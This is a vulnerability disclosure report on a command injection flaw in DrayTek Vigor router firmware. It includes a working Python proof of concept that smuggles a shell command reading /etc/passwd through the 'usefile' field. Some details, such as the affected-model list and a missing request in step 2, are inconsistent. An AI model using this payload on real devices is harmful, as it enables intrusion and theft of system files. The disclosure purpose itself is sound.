# CVE Report - Command Injection Vulnerability in DrayTek Vigor Routers (Affected Versions Below 1.5.1.5_Beta)

## Vulnerability Title

Command Injection Vulnerability in DrayTek Vigor Routers (Affected Versions Below 1.5.1.5_Beta)

## Vulnerability Description

DrayTek Vigor 3900, DrayTek Vigor 2960, and DrayTek Vigor 300B routers are vulnerable to a command injection flaw in versions below 1.5.1.5_Beta. This vulnerability occurs when the `action` parameter in `cgi-bin/mainfunction.cgi` is set to `jsonstatus`. At this point, the system directly calls the `system` function to execute commands, rather than using a safer function like `remove`, leading to inadequate blacklist policies and allowing malicious users to inject and execute arbitrary commands.

## Reproduction Steps

1. Log in to the DrayTek Vigor router.

2. Capture and send the following request, which successfully executes the command:

3. Use the following Python code to test the vulnerability:

   ```py
   import requests
   
   ip = "10.10.10.2"
   cookie_value = "7:95164F17CBFE1D19FD3CE3AC8EEE48A0"
   
   headers = {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
       "Content-Type": "application/x-www-form-urlencoded",
       "Accept": "*/*",
       "Origin": f"http://{ip}",
       "Referer": f"http://{ip}/",
       "Accept-Encoding": "gzip, deflate, br",
       "Accept-Language": "en-US,en;q=0.9",
       "Connection": "close",
   }
   
   cookies = {
       "SESSION_ID_VIGOR": cookie_value
   }
   
   data = {
       "config": "network",
       "usefile": "&cat</etc/passwd&",
       "table": "system",
       "action": "jsonstatus",
       "rtick": "1722602303899",
       "usescript": "1"
   }
   
   response = requests.post(f"http://{ip}/cgi-bin/mainfunction.cgi", headers=headers, cookies=cookies, data=data)
   
   print(response.text)
   ```

4. The response from the request shows the output of the injected command.

## Cause Analysis

The cause of this vulnerability is that `cgi-bin/mainfunction.cgi` directly calls the `system` function when the `action` parameter is set to `jsonstatus`, rather than using a safer function like `remove`. Additionally, the system's blacklist policy is not strict enough, allowing for command injection.

## Affected Versions

- DrayTek Vigor 2960
- DrayTek Vigor 3900

Affected versions are below 1.5.1.5_Beta.
